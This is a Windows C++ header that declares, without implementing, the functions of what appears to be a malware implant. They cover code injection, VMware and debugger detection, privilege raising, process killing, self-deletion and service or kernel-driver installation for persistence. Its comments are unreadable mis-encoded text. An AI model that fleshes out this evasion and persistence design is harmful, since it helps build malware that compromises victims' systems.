// InstallService.h: interface for the InstallService class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_INSTALLSERVICE_H__CC062F67_F199_45A8_9C6D_296960666AE3__INCLUDED_)
#define AFX_INSTALLSERVICE_H__CC062F67_F199_45A8_9C6D_296960666AE3__INCLUDED_
#include  <io.h>
#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
void ZhuRu();
void sleep_sleep();
void SetRegInfo();
void Vmware();
void ShaiXian();
void KProcess();
DWORD WINAPI Block_sleep(LPVOID lpParameter);
void RaiseToDebugP();
void EncryptData(char*szRec, unsigned long nLen, unsigned long key);
BOOL IsGuardPages();
BOOL IsInsideVMWare();
BOOL OccupyFile(LPCTSTR lpFileName);
void MyCreatDirector(LPSTR Path);
BOOL NtStartService(LPCTSTR lpService);
BOOL NtStopService(LPCTSTR lpService);
void ServiceMain(DWORD dwargc,wchar_t* argv[]);
//BOOL StupServe(char *strServiceName,char *strDisplayName,char *strDescription,char *strFileName);
BOOL NtInstallService(LPCTSTR strServiceName, //��������
					  LPCTSTR strDisplayName, //������ʾ����
					  LPCTSTR strDescription,//��������
					  LPCTSTR strPathName,   //��ִ���ļ���·��
					  LPCTSTR Dependencies,//ָ�������÷���ǰ�����������ķ���������,һ��ΪNULL
					  BOOLEAN KernelDriver, //�Ƿ�װ��������
					  ULONG   StartType		//��������
					  );
void NtUninstallService(LPCTSTR ServiceName);
HANDLE RunInActiveSession(LPCTSTR lpCommandLine);
void ServiceMain(DWORD dwargc,wchar_t* argv[]);
void DeleteSelf();
#endif // !defined(AFX_INSTALLSERVICE_H__CC062F67_F199_45A8_9C6D_296960666AE3__INCLUDED_)
